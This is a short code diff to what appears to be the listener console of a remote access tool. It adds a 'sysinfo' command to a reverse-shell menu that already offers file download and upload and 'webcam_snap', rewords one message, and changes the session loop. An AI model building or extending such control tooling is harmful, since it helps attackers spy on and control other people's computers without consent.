@@ -153,6 +153,7 @@ def start_listening():
     menu = "=========================================================\n"
     menu += "The Listening mode is base on Reverse Shell        \n"
     menu += "You can use some extra command below \n\n"
+    menu += bcolors.GREEN + "sysinfo\n" + bcolors.ENDC
     menu += bcolors.GREEN + "download <remote filename> <local filename>\n" + bcolors.ENDC
     menu += bcolors.GREEN + "upload <local filename> <remote filename>\n" + bcolors.ENDC
     menu += bcolors.GREEN + "webcam_snap <local filename>\n" + bcolors.ENDC
@@ -169,7 +170,7 @@ def start_listening():
                 for k in l.sessions.keys():
                     print(bcolors.GREEN + f"Session {k} open" + bcolors.ENDC)
             else:
-                print("No such session")
+                print("No session")
         elif se[:10] == "session -d":
             num = se[11:]
             try:
@@ -193,7 +194,8 @@ def start_listening():
                     ses = l.sessions.get(int(num))
                     print(f"select session {num}")
                     parent_conn = ses[0]
-                    while 1:
+                    while l.sessions.get(int(num)):
+                        print(l.sessions.get(int(num)))
                         cmd = input()
                         if cmd == "background":
                             print(bcolors.OCRA + f"session {num} background.." + bcolors.ENDC)
